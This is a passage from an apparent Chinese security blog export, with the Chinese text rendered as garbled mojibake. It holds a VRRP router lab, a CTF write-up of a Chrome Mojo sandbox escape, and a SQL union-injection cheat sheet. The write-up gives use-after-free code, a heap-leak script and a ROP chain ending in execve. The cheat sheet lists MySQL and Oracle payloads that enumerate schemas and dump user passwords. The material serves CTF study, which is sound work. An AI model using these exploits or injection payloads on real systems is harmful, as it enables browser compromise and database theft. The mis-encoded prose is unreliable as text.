å—ç›Š</h3><p>åœ¨å…·æœ‰å¤šæ’­æˆ–å¹¿æ’­èƒ½åŠ›çš„å±€åŸŸç½‘ï¼ˆå¦‚ä»¥å¤ªç½‘ï¼‰ä¸­ï¼Œå€ŸåŠ©VRRPèƒ½åœ¨ç½‘å…³è®¾å¤‡å‡ºç°æ•…éšœæ—¶ä»ç„¶æä¾›é«˜å¯é çš„ç¼ºçœé“¾è·¯ï¼Œæ— éœ€ä¿®æ”¹ä¸»æœºåŠç½‘å…³è®¾å¤‡çš„é…ç½®ä¿¡æ¯ä¾¿å¯æœ‰æ•ˆé¿å…å•ä¸€é“¾è·¯å‘ç”Ÿæ•…éšœåçš„ç½‘ç»œä¸­æ–­é—®é¢˜ã€‚</p><h2 id="å®éªŒæ‹“æ‰‘"><a href="#å®éªŒæ‹“æ‰‘" class="headerlink" title="å®éªŒæ‹“æ‰‘"></a>å®éªŒæ‹“æ‰‘</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/323009249.png"></p><h2 id="å®éªŒè®¡åˆ’"><a href="#å®éªŒè®¡åˆ’" class="headerlink" title="å®éªŒè®¡åˆ’"></a>å®éªŒè®¡åˆ’</h2><p>PC1å’ŒPC2é€šè¿‡SwitchåŒå½’å±åˆ°AR1å’ŒAR2ã€‚ç”¨æˆ·å¸Œæœ›PC1ä»¥PC1ä¸ºé»˜è®¤ç½‘å…³æ¥å…¥Internetï¼ŒAR2ä½œä¸ºå¤‡ä»½ç½‘å…³ï¼›PC2ä»¥AR2ä¸ºé»˜è®¤ç½‘å…³æ¥å…¥Internetï¼ŒAR1ä½œä¸ºå¤‡ä»½ç½‘å…³ï¼Œä»¥å®ç°æµé‡çš„è´Ÿè½½å‡è¡¡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.è®¾ç½®å„è®¾å¤‡æ¥å£çš„ipåœ°å€</span><br><span class="line"></span><br><span class="line">2.ç”¨OSPFè¿é€šå„è®¾å¤‡</span><br><span class="line"></span><br><span class="line">3.20.1.1.0&#x2F;24å¯¼å…¥OSPF</span><br><span class="line"></span><br><span class="line">4.è®¾ç½®VRRP</span><br><span class="line"></span><br><span class="line">5.æ£€éªŒ</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/984846336.png"></p><p>Vrrp vrid 1 virtual-ipè¡¨æ˜ç»„1çš„è™šæ‹Ÿè·¯ç”±å™¨çš„åœ°å€ï¼ˆPC1çš„ç½‘å…³ï¼‰ vrrp 1 proirity 120è®¾ç½®ä¼˜å…ˆçº§ï¼Œæˆä¸ºç»„1çš„masterã€‚</p><p>Vrrp vrid 1 preempt-mode timer delay 20 æŠ¢å æ—¶é—´20s</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4005734468.png"></p><p>AR3: è®¾ç½®OSPFåï¼Œå†æŠŠç›´è¿è·¯ç”±å¼•å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3461446210.png"></p><p>æŸ¥çœ‹AR1çš„vrrpï¼Œå¯ä»¥çœ‹åˆ°AR1åœ¨å¤‡ä»½ç»„1ä¸­ä½œä¸ºMasterè®¾å¤‡ï¼Œåœ¨å¤‡ä»½ç»„2ä¸­ä½œä¸ºBackupè®¾å¤‡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3629781823.png"></p><p>æŸ¥çœ‹AR2çš„vrrpï¼Œå¯ä»¥çœ‹åˆ°AR2åœ¨å¤‡ä»½ç»„2ä¸­ä½œä¸ºMasterè®¾å¤‡ï¼Œåœ¨å¤‡ä»½ç»„1ä¸­ä½œä¸ºBackupè®¾å¤‡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3457383146.png"></p><p>å…³é—­AR1åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3410325565.png"></p><p>é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">AR1:</span><br><span class="line">interface GigabitEthernet&#x2F;0&#x2F;1</span><br><span class="line">ip address 192.168.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;0</span><br><span class="line">ip address 10.1.1.1 255.255.255.0</span><br><span class="line">vrrp vrid 1 virtual-ip 10.1.1.111</span><br><span class="line">vrrp vrid 1 priority 120</span><br><span class="line">vrrp vrid 1 preempt-mode timer delay 20</span><br><span class="line">vrrp vrid 2 virtual-ip 10.1.1.112</span><br><span class="line">#</span><br><span class="line">ospf 1</span><br><span class="line">area 0.0.0.0</span><br><span class="line">network 192.168.1.0 0.0.0.255</span><br><span class="line">network 10.1.1.0 0.0.0.255</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AR2:</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;1</span><br><span class="line">ip address 192.168.2.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;0</span><br><span class="line">ip address 10.1.1.2 255.255.255.0</span><br><span class="line">vrrp vrid 1 virtual-ip 10.1.1.111</span><br><span class="line">vrrp vrid 2 virtual-ip 10.1.1.112</span><br><span class="line">vrrp vrid 2 priority 120</span><br><span class="line">vrrp vrid 2 preempt-mode timer delay 20</span><br><span class="line">#</span><br><span class="line">ospf 1</span><br><span class="line">area 0.0.0.0</span><br><span class="line">network 192.168.2.0 0.0.0.255</span><br><span class="line">network 10.1.1.0 0.0.0.255</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AR3:</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;0</span><br><span class="line">ip address 192.168.1.2 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;1</span><br><span class="line"></span><br><span class="line">ip address 192.168.2.2 255.255.255.0</span><br><span class="line">#</span><br><span class="line">interface GigabitEthernet0&#x2F;0&#x2F;2</span><br><span class="line">ip address 20.1.1.1 255.255.255.0</span><br><span class="line">#</span><br><span class="line">ospf 1</span><br><span class="line">area 0.0.0.0</span><br><span class="line">network 192.168.1.0 0.0.0.255</span><br><span class="line">network 192.168.2.0 0.0.0.255</span><br><span class="line">network 20.1.1.0 0.0.0.255</span><br><span class="line">#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œå·¥ç¨‹å¸ˆå…»æˆè®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢Chromeæ²™ç®±é€ƒé€¸</title>
      <link href="2020/09/24/%E5%88%9D%E6%8E%A2Chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>2020/09/24/%E5%88%9D%E6%8E%A2Chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a>1.Background</h1><h2 id="Chrome-Security-Architecture"><a href="#Chrome-Security-Architecture" class="headerlink" title="Chrome Security Architecture"></a>Chrome Security Architecture</h2><p>ä¼—æ‰€å‘¨çŸ¥æ²™ç®±æ˜¯Chromeé‡è¦çš„å®‰å…¨æœºåˆ¶ï¼Œæœ‰æ²™ç®±å°±æ„å‘³ç€v8ã€éŸ³è§†é¢‘è§£ç ç­‰ç­‰æ¸²æŸ“å±‚çš„æ¼æ´ä¸èƒ½ç›´æ¥æ‰“åˆ°hostä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦pwn Chromeè‡³å°‘è¦ä¸¤ä¸ªæ¼æ´ï¼Œæ²™ç®±è¿›ç¨‹çš„rceå’Œæ²™ç®±é€ƒé€¸ã€‚</p><h2 id="Chromeå®‰å…¨æ¶æ„å¦‚ä¸‹"><a href="#Chromeå®‰å…¨æ¶æ„å¦‚ä¸‹" class="headerlink" title="Chromeå®‰å…¨æ¶æ„å¦‚ä¸‹"></a>Chromeå®‰å…¨æ¶æ„å¦‚ä¸‹</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2170576533.png"></p><h2 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h2><p>Mojoæ˜¯Chromeæ–°çš„IPCæœºåˆ¶ï¼Œä»Mojoæ–‡æ¡£ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒMojo is a collection of runtime libraries providing a platform-agnostic abstraction of common IPC primitives, a message IDL format, and a bindings library with code generation for multiple target languages to facilitate convenient message passing across arbitrary inter- and intra-process boundaries. ç›®å‰æ¥çœ‹æ— è®ºæ˜¯CTFè¿˜æ˜¯Real Worldä¸­ï¼Œåˆ©ç”¨Mojoè¿›è¡ŒChromeæ²™ç®±é€ƒé€¸éƒ½å¾ˆå¸¸è§ã€‚</p><hr><h1 id="2-0CTF-TCTF2020-Quals-ChromiumSBX"><a href="#2-0CTF-TCTF2020-Quals-ChromiumSBX" class="headerlink" title="2.0CTF/TCTF2020 Quals ChromiumSBX"></a>2.0CTF/TCTF2020 Quals ChromiumSBX</h1><p>æ¥çœ‹è¿™ä¸ªä¾‹å­ã€‚è¿™æ˜¯0ctf/tctf 2020 qualsçš„ä¸€é“æµè§ˆå™¨é¢˜ï¼Œé€šè¿‡diffå¯ä»¥çœ‹åˆ°å¢åŠ äº†ä¸€ä¸ªæ–°çš„mojo serviceï¼Œä»£ç å¾ˆå¥½ç†è§£ï¼Œæ˜¯ä¸€ä¸ªstorage serviceã€‚</p><h2 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h2><p>é€šè¿‡å®¡è®¡å¯ä»¥å‘ç°å¦‚ä¸‹é—®é¢˜ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void TStorageImpl::Init(InitCallback callback) &#123;</span><br><span class="line">    inner_db_ &#x3D; std::make_unique&lt;InnerDbImpl&gt;();</span><br><span class="line">    &#x2F;&#x2F; Init will release the previous inner_db pointer</span><br><span class="line">    std::move(callback).Run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TStorageImpl::CreateInstance(CreateInstanceCallback callback) &#123;</span><br><span class="line">    mojo::PendingRemote&lt;blink::mojom::TInstance&gt; instance;</span><br><span class="line">    mojo::MakeSelfOwnedReceiver(std::make_unique&lt;content::TInstanceImpl&gt;(inner_db_.get()),</span><br><span class="line">                            instance.InitWithNewPipeAndPassReceiver());</span><br><span class="line">    &#x2F;&#x2F; so inner_db_.get() pointer obtained previously will be freed</span><br><span class="line">    &#x2F;&#x2F; which is UAF</span><br><span class="line">    std::move(callback).Run(std::move(instance));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TStorageImpl::CreateInstanceä¼šä½¿ç”¨inner_db_.get()å°†å­˜å‚¨åœ¨inner_db_å†…éƒ¨çš„æŒ‡é’ˆä¼ é€’åˆ°TInstanceImplçš„æ„é€ å‡½æ•°ä¸­ï¼Œæ–°çš„TInstanceImplå®ä¾‹ä¼šå°†æŒ‡é’ˆå­˜å‚¨åˆ°å…¶å­—æ®µä¸­ï¼›ä½†æ˜¯è§‚å¯ŸTStorageImpl::Initæ˜¯å¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨çš„ï¼Œæ¯æ¬¡è°ƒç”¨å®ƒä¼šæŠŠå‰ä¸€ä¸ªå¯¹è±¡é‡Šæ”¾ï¼Œä½†å‰ä¸€ä¸ªå¯¹è±¡å·²ç»è¢«TInstanceImplå­˜å‚¨ï¼Œä¼šé€ æˆUAFã€‚</p><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><h4 id="1-å †å–·å ä½"><a href="#1-å †å–·å ä½" class="headerlink" title="1.å †å–·å ä½"></a>1.å †å–·å ä½</h4><p>æ¼æ´ç‚¹æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½è§¦å‘çš„UAFï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯å»å ä½ï¼Œé€šè¿‡è°ƒè¯•å¯ä»¥å‘ç°InnerDbImplçš„å¤§å°æ˜¯0x678ï¼Œè§‚å¯Ÿä¸€ä¸‹æˆ‘ä»¬å¯ä»¥æ§åˆ¶å¤§å°çš„å¯¹è±¡ï¼Œçœ‹åˆ°äº† <code>base::queue&lt;uint64_t&gt; queue_</code> ï¼Œå®ƒæ˜¯stlçš„å®¹å™¨ï¼Œé€šè¿‡pushå’Œpopå¯ä»¥æ§åˆ¶å…¶å¤§å°ï¼Œå…·ä½“æŠŠå¤§å°è°ƒæ•´åˆ°0x678çš„æ–¹æ³•è§æˆåŠŸ2019çš„åšå®¢ï¼Œå†™çš„å¾ˆæˆåŠŸæˆ‘ä¸å•°å—¦äº†ã€‚</p><blockquote><p>æˆåŠŸ2019çš„åšå®¢ï¼š<br><a href="https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html">https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html</a></p></blockquote><h4 id="2-æ³„éœ²å †åœ°å€"><a href="#2-æ³„éœ²å †åœ°å€" class="headerlink" title="2.æ³„éœ²å †åœ°å€"></a>2.æ³„éœ²å †åœ°å€</h4><p>ä¸ºäº†åŠ«æŒè™šè¡¨ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²å †åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥ç”¨æˆ‘ä»¬å ä½æˆåŠŸé‚£ä¸ªå¯¹è±¡æ¥æ³„éœ²UAFå¯¹è±¡çš„base::queueæŒ‡é’ˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; tInsPtr here is the UAF object</span><br><span class="line">const idx &#x3D; (await tInsPtr.getInt()).value;</span><br><span class="line">print(idx); &#x2F;&#x2F; get which one is occupying the UAF object</span><br><span class="line">for (let i &#x3D; 0; i &lt; 201; i++)</span><br><span class="line">await tInsPtrSprays[idx].pop();</span><br><span class="line">const heapAddr &#x3D; (await tInsPtrSprays[idx].pop()).value;</span><br><span class="line">&#x2F;&#x2F; pop element to leak the address of heap</span><br><span class="line">&#x2F;&#x2F; now 0x678 is freed again due to poping elements</span><br><span class="line">print(hex(heapAddr));</span><br></pre></td></tr></table></figure><h4 id="3-ä»£ç æ‰§è¡Œï¼š"><a href="#3-ä»£ç æ‰§è¡Œï¼š" class="headerlink" title="3.ä»£ç æ‰§è¡Œï¼š"></a>3.ä»£ç æ‰§è¡Œï¼š</h4><p>åŸºæœ¬æ¡ä»¶éƒ½æœ‰äº†ï¼Œå¼€å§‹æ„é€ ropåŠ«æŒè™šè¡¨ï¼Œå‚è€ƒPlaid CTF mojoé¢˜çš„expï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">await tInsPtr.push(libcAddr + 0x52bc8);  &#x2F;&#x2F; pop rbp; pop rbx; ret;</span><br><span class="line">await tInsPtr.push(0);           &#x2F;&#x2F; let queue to have some element</span><br><span class="line">await tInsPtr.push(textAddr + 0x3fa5114); &#x2F;&#x2F; xchg rsp,rax, as virtual table</span><br><span class="line">await tInsPtr.push(libcAddr + 0x2cb49);  &#x2F;&#x2F; pop rbx; ret;</span><br><span class="line">await tInsPtr.push(libcAddr + 0xe4e30);  &#x2F;&#x2F; execve</span><br><span class="line">await tInsPtr.push(libcAddr + 0x1b96);  &#x2F;&#x2F; pop rdx; ret;</span><br><span class="line">await tInsPtr.push(0);           &#x2F;&#x2F; rdx &#x3D; 0</span><br><span class="line">await tInsPtr.push(libcAddr + 0xd1ba7);  &#x2F;&#x2F; lea rdi, [rsp + 0xb0]; mov rsi, rbp; call rbx</span><br></pre></td></tr></table></figure><h3 id="å®Œæ•´exploit"><a href="#å®Œæ•´exploit" class="headerlink" title="å®Œæ•´exploit"></a>å®Œæ•´exploit</h3><blockquote><p>æˆåŠŸ2019çš„exp<br><a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/T20ChromeSBX.html">https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/T20ChromeSBX.html</a></p></blockquote><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>ä¸Šè¿°åŸºæœ¬æ˜¯ä¸€é“mojoæ²™ç®±é€ƒé€¸çš„å…¸å‹ä¾‹é¢˜ï¼Œæ‰‹æ³•å’Œæ€æƒ³éƒ½æ¯”è¾ƒç»å…¸ã€‚è§£é¢˜åŸºæœ¬å‚ç…§2019çš„æ€è·¯æ¥çš„ï¼ŒPerfect Blueè¿™é‡Œä¹Ÿæœ‰å¾ˆè¯¦ç»†çš„writeupã€‚</p><blockquote><p>Perfect Blueçš„åšå®¢<br><a href="https://blog.perfect.blue/Chromium-Fullchain">https://blog.perfect.blue/Chromium-Fullchain</a></p></blockquote><p>å¦å¤–å…³äºMojoè¿˜æœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´æ˜¯Issue 1062091ï¼Œåç»­æ–‡ç« å¯èƒ½ä¼šåˆ†æã€‚</p><p>é™¤äº†Mojoï¼ŒAndroid Binderçš„CVE-2020-0041ï¼ŒWindowså†…æ ¸çš„CVE-2020-0981ç­‰è¿™ç§ä¹Ÿå¯ä»¥è¢«ç”¨æ¥é€ƒé€¸Chromeæ²™ç®±ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒé“¾æ¥ï¼š</span><br><span class="line">1.https:&#x2F;&#x2F;theori.io&#x2F;research&#x2F;escaping-chrome-sandbox&#x2F;</span><br><span class="line">2.https:&#x2F;&#x2F;mem2019.github.io&#x2F;jekyll&#x2F;update&#x2F;2020&#x2F;07&#x2F;03&#x2F;TCTF-Chromium-SBX.html</span><br><span class="line">3.https:&#x2F;&#x2F;gist.github.com&#x2F;ujin5&#x2F;5b9a2ce2ffaf8f4222fe7381f792cb38</span><br><span class="line">4.https:&#x2F;&#x2F;docs.google.com&#x2F;drawings&#x2F;d&#x2F;1TuECFL9K7J5q5UePJLC-YH3satvb1RrjLRH-tW_VKeE&#x2F;edit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥-è”åˆæŸ¥è¯¢æ€»ç»“</title>
      <link href="2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/"/>
      <url>2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>è”åˆæŸ¥è¯¢æ³¨å…¥åˆ©ç”¨çš„æ¡ä»¶ï¼šé¡µé¢ä¸Šæœ‰æ˜¾ç¤ºä½</p><p>è”åˆæ³¨å…¥çš„è¿‡ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1ã€åˆ¤æ–­æ³¨å…¥ç‚¹</span><br><span class="line"></span><br><span class="line">2ã€åˆ¤æ–­æ˜¯æ•´å‹è¿˜æ˜¯å­—ç¬¦å‹</span><br><span class="line"></span><br><span class="line">3ã€åˆ¤æ–­æŸ¥è¯¢åˆ—æ•°</span><br><span class="line"></span><br><span class="line">4ã€åˆ¤æ–­æ˜¾ç¤ºä½</span><br><span class="line"></span><br><span class="line">5ã€è·å–æ‰€æœ‰æ•°æ®åº“å</span><br><span class="line"></span><br><span class="line">6ã€è·å–æ•°æ®åº“æ‰€æœ‰è¡¨å</span><br><span class="line"></span><br><span class="line">7ã€è·å–å­—æ®µå</span><br><span class="line"></span><br><span class="line">8ã€è·å–å­—æ®µä¸­çš„æ•°æ®</span><br></pre></td></tr></table></figure><p>æ•°æ®åº“åˆ¤æ–­ï¼š<br>1.ç”¨@@datadiræŸ¥çœ‹æ•°æ®åº“å®‰è£…ç›®å½•ï¼Œèƒ½å¦åˆ¤æ–­å‡º<br>2.é€šè¿‡å„ä¸ªæ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mssql:and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">Accese:and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">mysql:and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1 </span><br><span class="line">oracle:and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>ç»ˆææ³•å® ï¼šæŠ¥é”™ä¿¡æ¯ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</strong></p><h3 id="mysqlæ³¨å…¥ï¼š"><a href="#mysqlæ³¨å…¥ï¼š" class="headerlink" title="mysqlæ³¨å…¥ï¼š"></a>mysqlæ³¨å…¥ï¼š</h3><p>æ³¨å…¥åˆ¤æ–­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">And 1&#x3D;1</span><br><span class="line">ord(0x1)</span><br><span class="line">&gt; </span><br><span class="line">\\</span><br><span class="line">&#x2F;</span><br><span class="line">#</span><br><span class="line">--+-</span><br><span class="line">^1^0</span><br></pre></td></tr></table></figure><p>å­—æ®µæ•°åˆ¤æ–­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Order by 3 --</span><br></pre></td></tr></table></figure><p>è·å–æ‰€æœ‰æ•°æ®åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>è·å–è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select table_name from information_schema.tables where table_schema&#x3D;database() --</span><br></pre></td></tr></table></figure><p>è·å–å­—æ®µåï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select column_name from information_schema.columns where table_schema&#x3D;table_name -</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ•°æ®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(concat_ws(char(32,58,32),first_name,password))  from users --</span><br></pre></td></tr></table></figure><p>å†…ç½®å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ‹†è§£æ•°æ®åº“åï¼šdatabase() ç”¨æˆ·åï¼šuser() ç‰ˆæœ¬ï¼šversion() æˆ– @@version</span><br><span class="line">æ•°æ®åº“è·¯å¾„ï¼š@@datadir</span><br></pre></td></tr></table></figure><p><strong>mysql</strong>é€šè¿‡information_schemaè¿™ä¸ªè¡¨æŸ¥è¯¢ç›¸åº”çš„æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåã€‚</p><h3 id="oracleæ³¨å…¥ï¼š"><a href="#oracleæ³¨å…¥ï¼š" class="headerlink" title="oracleæ³¨å…¥ï¼š"></a>oracleæ³¨å…¥ï¼š</h3><p>è·å–æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- éœ€è¦é«˜æƒé™</span><br></pre></td></tr></table></figure><p>è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br></pre></td></tr></table></figure><p>å­—æ®µæ•°åˆ¤æ–­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 3 --</span><br><span class="line">and 1&#x3D;2 union select null,null,null from dual--</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å­æ®µçš„æ•°æ®ç±»å‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select &#39;null&#39;,null,null from dual--  &#x2F;&#x2F;è¿”å›æ­£å¸¸ï¼Œåˆ™ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯å­—ç¬¦å‹ï¼Œè¿”å›é”™è¯¯ï¼Œä¸ºå­—ç¬¦å‹ï¼Œè¿”å›é”™è¯¯ï¼Œä¸ºå­—ç¬¦å‹</span><br></pre></td></tr></table></figure><p>æ•°æ®åº“ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual--  &#x2F;&#x2F;æ¢æµ‹æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual--  &#x2F;&#x2F;æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨å</span><br><span class="line">and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;&#39;STUDENT&#39;),null from dual--  &#x2F;&#x2F;ç¬¬äºŒä¸ªè¡¨å</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å­—æ®µåï¼š</p><figure class="highlight plain"><table><tr><td 